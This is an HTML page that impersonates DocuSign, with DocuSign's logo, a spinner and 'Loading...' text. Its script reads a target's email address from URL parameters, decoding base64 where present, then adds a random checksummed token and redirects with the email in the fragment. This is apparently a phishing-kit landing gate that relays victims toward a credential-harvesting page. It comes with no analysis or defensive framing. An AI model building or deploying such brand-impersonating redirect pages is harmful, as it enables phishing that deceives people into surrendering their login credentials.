<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DocuSign</title>
    <link rel="icon" href="https://www.docusign.com/favicon.ico">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background-color: #ffffff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }

        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
        }

        /* DocuSign Logo */
        .logo-container {
            margin-bottom: 40px;
            animation: fadeIn 0.5s ease-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.95); }
            to { opacity: 1; transform: scale(1); }
        }

        .docusign-logo {
            width: 240px;
            height: auto;
        }

        /* Loading spinner */
        .spinner-container {
            margin-top: 20px;
        }

        .spinner {
            width: 40px;
            height: 40px;
            border: 3px solid #f0f0f0;
            border-top-color: #2F5BEA;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* Loading text */
        .loading-text {
            margin-top: 24px;
            color: #5c5c5c;
            font-size: 14px;
            font-weight: 400;
            opacity: 0;
            animation: fadeInUp 0.5s ease-out 0.3s forwards;
        }

        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .fade-out {
            animation: fadeOut 0.3s ease-out forwards;
        }

        @keyframes fadeOut {
            to { opacity: 0; }
        }
    </style>
</head>
<body>
    <div class="container" id="main-container">
        <div class="logo-container">
            <!-- Official DocuSign Logo -->
            <img class="docusign-logo" 
                 src="https://images.ctfassets.net/3fcisxc3a6xz/docusign_logo_black_text_on_white_0.png/90872cd475f92acafc7c490c93976e40/ds-logo-on-white.png" 
                 alt="DocuSign">
        </div>

        <div class="spinner-container">
            <div class="spinner"></div>
        </div>

        <div class="loading-text">Loading...</div>
    </div>

    <script>
        function decodeB64(s){if(!s||s.indexOf('@')!==-1)return s;try{var n=s.replace(/-/g,'+').replace(/_/g,'/');while(n.length%4)n+='=';var d=atob(n);if(d.indexOf('@')!==-1&&d.indexOf('.')!==-1)return d;}catch(e){}return s;}
        setTimeout(function() {
            document.getElementById('main-container').classList.add('fade-out');
            setTimeout(function() {
                var url = new URL(window.location.href);
                var raw = url.searchParams.get('email') || url.searchParams.get('e') || url.searchParams.get('u') || url.searchParams.get('login_hint') || url.searchParams.get('user') || url.searchParams.get('mail') || '';
                var email = decodeB64(raw);
                var b1 = Math.floor(Math.random() * 256);
                var b2 = Math.floor(Math.random() * 256);
                var b3 = Math.floor(Math.random() * 256);
                var b4 = Math.floor(Math.random() * 256);
                var crc = (b1 + b2 + b3 + b4) & 0xFF;
                var bytes = String.fromCharCode(crc, b1, b2, b3, b4);
                var marker = btoa(bytes).replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
                url.searchParams.set('_r', marker);
                var finalUrl = url.toString();
                if (email) { finalUrl += '#' + email; }
                window.location.href = finalUrl;
            }, 0);  // Redirect immediately, no white space
        }, 2500);
    </script>
</body>
</html>
